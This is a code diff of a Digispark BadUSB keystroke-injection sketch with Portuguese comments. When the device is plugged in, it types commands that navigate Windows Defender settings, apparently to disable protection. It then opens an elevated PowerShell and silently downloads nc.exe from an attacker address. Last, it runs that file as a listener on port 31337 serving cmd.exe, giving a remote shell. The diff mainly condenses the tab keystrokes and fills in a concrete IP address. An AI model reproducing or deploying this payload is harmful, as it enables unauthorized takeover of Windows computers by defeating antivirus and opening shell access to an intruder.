@@ -16,23 +16,13 @@ void loop() {
   DigiKeyboard.delay(1500);
   DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.print("\t");  
+  DigiKeyboard.print("\t\t\t\t"); //4 TAB
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_SPACE);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("\t");  //1 TAB
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("\t");  //1 TAB
+  DigiKeyboard.print("\t\t");  //2 TAB
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
@@ -43,9 +33,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell start-process powershell -verb runas");  
   DigiKeyboard.delay(2000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.print("\t");
+  DigiKeyboard.print("\t\t"); //2 TAB
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
@@ -64,7 +52,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://YOURIP/nc.exe -OutFile test.exe");
+  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://192.168.0.192/nc.exe -OutFile tester.exe");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
@@ -74,7 +62,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden ./test.exe -Lp 31337 -e cmd.exe");
+  DigiKeyboard.println("powershell -windowstyle hidden ./tester.exe -Lp 31337 -e cmd.exe");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //
